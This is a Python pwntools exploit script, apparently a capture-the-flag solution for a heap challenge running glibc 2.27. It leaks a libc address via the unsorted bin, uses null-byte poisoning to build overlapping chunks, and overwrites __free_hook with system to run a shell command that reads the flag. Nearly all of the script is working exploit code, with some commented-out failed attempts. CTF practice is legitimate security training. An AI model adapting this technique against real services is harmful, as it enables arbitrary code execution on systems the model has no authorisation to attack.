#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./chall')
host = 'mc.ax'
port = 32526

libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
# rop = ROP(exe)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe



# Run without randomization
# python3 solve.py GDB NOASLR



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([ld.path, exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": libc.path})
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": libc.path})
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
        # return process([exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})

gdbscript = '''
b *main
b *print_menu
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def str(io, s, length):
    io.sendline(b'1')
    print(io.recvuntil(b'size? '))
    io.sendline(length)
    print(io.recvuntil(b'str? '))
    io.sendline(s)
    
    
def tok(io, idx, delim):
    io.sendline(b'2')
    print(io.recvuntil(b'idx? '))
    io.sendline(idx)
    print(io.recvuntil(b'delim? '))
    io.sendline(delim)
    
def delete(io, idx):
    io.sendline(b'3')
    print(io.recvuntil(b'idx? '))
    io.sendline(idx)

def solve():
    io = conn()
    
    io.recv()
    
    # ------ LIBC LEAK ------ 
    log.info("Create large chunk")
    str(io, b'A', b'1496')
    
    print(io.recv())
    
    log.info("Create barrier chunk to prevent consolidation")
    str(io, b'x'*0x28, b'40')
    
    print(io.recv())
    
    log.info("Free -> unsorted bin")
    delete(io, b'0')
    
    print(io.recv())
    
    log.info("Create another chunk of same size")
    str(io, b'C'*7, b'1496')
    
    print(io.recv())
    
    log.info("libc leak")
    tok(io, b'0', b'\x0a')
    
    print(io.recvuntil(b'\n'))
    
    # receive 6 bytes in little endian and convert to pointer
    libc_leak = u64(io.recv(6) + b'\x00\x00')
    log.success("Libc leak: " + hex(libc_leak))
    
    libc.address = libc_leak - libc.sym['main_arena'] - 96
    log.success("Libc base: " + hex(libc.address))
    
    free_hook = libc.sym['__free_hook']
    log.success("__free_hook: " + hex(free_hook))
    
    print(io.recv())
    
    # ------ NULL BYTE POISONING ------
    log.info("Begin Null byte poisoning")
    
    log.info("Create chunks a, b, c, barrier")
    str(io, b'A'*0x4f8, '{:d}'.format(0x4f8).encode())
    print(io.recv())
    
    str(io, b'B'*0x68, '{:d}'.format(0x68).encode())
    print(io.recv())
    
    str(io, b'C'*0x4f8, '{:d}'.format(0x4f8).encode())
    print(io.recv())
    
    str(io, b'x'*0x28, '{:d}'.format(0x28).encode())
    print(io.recv())
    
    
    log.info("Free a")
    delete(io, b'2')
    print(io.recv())
    
    log.info("Set C prev-in-use to 0 via null byte overflow")
    tok(io, b'3', b'\x01')
    print(io.recv())
    
    log.info("Delete b")
    delete(io, b'3')
    print(io.recv())
    
    log.info("Create b again and write 0x570 to prev_size")
    str(io, b'p'*0x60 + p64(0x570), '{:d}'.format(0x68).encode())
    print(io.recv())
    
    log.info("Free b")
    delete(io, b'2')
    print(io.recv())
    
    log.info("Delete c - cause consolidation")
    delete(io, b'4')
    print(io.recv())
    
    # log.info("Create a again")
    # str(io, b'q'*0x4f8, '{:d}'.format(0x4f8).encode())
    # print(io.recv())
    
    log.info("Create bigger a")
    str(io, b'q'*0x500 + p64(free_hook), '{:d}'.format(0x568).encode())
    

    # log.info("Free b")
    # delete(io, b'2')
    # print(io.recv())
    
        # log.info("Free b2")
        # delete(io, b'4')
        # print(io.recv())
    
    
    
    
    # log.info("Create b2")
    # str(io, b'r'*0x68, '{:d}'.format(0x68).encode())
    # print(io.recv())
    
    # log.info("Create b3 (for libc protection)")
    # str(io, b's'*0x68, '{:d}'.format(0x68).encode())
    # print(io.recv())
    
    # log.info("Free b")
    # delete(io, b'2')
    # print(io.recv())
    
    # # tried to prevent double free error but not working on remote
    # log.info("Free b3")
    # delete(io, b'6')
    # print(io.recv())
    
    # log.info("free b2")
    # delete(io, b'4')
    # print(io.recv())
    
    # str(io, p64(free_hook), '{:d}'.format(0x68).encode())
    # print(io.recv())
    
    # str(io, p64(free_hook), '{:d}'.format(0x68).encode())
    # print(io.recv())
    
    # str(io, p64(free_hook), '{:d}'.format(0x68).encode())
    # print(io.recv())
    
    
    # # ------ OVERWRITE __FREE_HOOK ------
    str(io, b'junk', '{:d}'.format(0x68).encode())
    print(io.recv())
     
    log.info("Overwrite __free_hook with system")
    str(io, p64(libc.sym['system']), '{:d}'.format(0x68).encode())
    print(io.recv())
    
    # ------ GET SHELL ------
    log.info("Get shell")
    str(io, b'/bin/cat flag.txt\x00', '{:d}'.format(0x28).encode())
    print(io.recv())
    
    delete(io, b'6')
    print(io.recv())
    
    io.interactive()
    
if __name__ == "__main__":
    solve()



